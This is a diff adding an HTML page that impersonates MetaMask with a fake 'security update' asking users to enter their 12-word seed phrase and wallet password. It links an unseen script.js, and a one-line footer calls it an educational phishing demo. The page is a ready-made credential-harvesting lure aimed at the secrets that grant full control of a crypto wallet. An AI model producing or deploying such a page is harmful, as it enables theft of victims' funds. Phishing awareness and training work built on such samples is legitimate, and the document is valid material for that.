@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>MetaMask Wallet - Update Required</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="container">
+    <h1>MetaMask Security Update</h1>
+    <p>To continue using your wallet securely, please re-authenticate.</p>
+
+    <form id="fake-form">
+      <label for="seed">Seed Phrase</label>
+      <input type="text" id="seed" placeholder="Enter 12-word seed phrase" required />
+      
+      <label for="pass">Wallet Password</label>
+      <input type="password" id="pass" placeholder="Wallet password" required />
+
+      <button type="submit">Update Wallet</button>
+    </form>
+
+    <p class="disclaimer">⚠️ This is a simulated phishing demo for educational purposes only.</p>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
